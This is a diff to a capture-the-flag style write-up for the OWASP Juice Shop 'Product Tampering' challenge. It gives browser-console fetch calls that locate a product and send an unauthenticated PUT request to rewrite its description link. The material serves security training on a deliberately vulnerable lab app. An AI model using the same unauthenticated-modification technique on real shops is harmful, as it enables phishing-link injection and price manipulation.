@@ -1,7 +1,10 @@
 # Product Tampering
 
+> [!WARNING]
+> This documentation is purely for educational purposes. Do not use these techniques on real systems without explicit permission.
+
 ## Category
-Broken Access Control — Difficulty: ⭐⭐⭐
+Broken Access Control (OWASP A01:2021) — Difficulty: ⭐⭐⭐
 
 ## Description
 
@@ -9,17 +12,20 @@ Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft)
 
 ## Vulnerability
 
-The `/api/Products/:id` endpoint allows unauthenticated PUT requests to modify product data. There is no authorization check to prevent users from modifying product descriptions.
+The `/api/Products/:id` endpoint allows unauthenticated PUT requests to modify product data. There is no authorization check to prevent users from modifying product descriptions. This is a classic Broken Access Control vulnerability where the server trusts the client without verifying identity or permissions.
 
 ## Steps
 
-1. Find the O-Saft product ID via the API:
+1. Open the Juice Shop in your browser at `http://localhost:3000`
+2. Open the browser developer tools by pressing `F12`
+3. Navigate to the **Console** tab
+4. First, find the O-Saft product ID by running:
 
 ```javascript
 fetch('/api/Products/').then(r=>r.json()).then(d=>console.log(d.data.find(p=>p.name.includes('O-Saft'))))
 ```
 
-2. Product ID is 9. Send a PUT request with the modified description:
+5. The product ID is **9**. Now send a PUT request to modify the description:
 
 ```javascript
 fetch('/api/Products/9', {
@@ -31,11 +37,15 @@ fetch('/api/Products/9', {
 }).then(r=>r.json()).then(console.log)
 ```
 
-3. The link in the product description now points to https://owasp.slack.com.
+6. The response shows `status: "success"` — the link has been changed.
+
+## Proof of Concept
+
+![Challenge solved](./Bildschirmfoto%202026-05-24%20um%2022.27.14.png)
 
 ## Impact
 
-An attacker can modify product descriptions, prices, or other data without authentication, leading to misinformation or financial damage.
+An attacker can modify product descriptions, prices, or links without any authentication. In a real shop this could lead to phishing attacks, price manipulation, or reputational damage.
 
 ## Mitigation
 
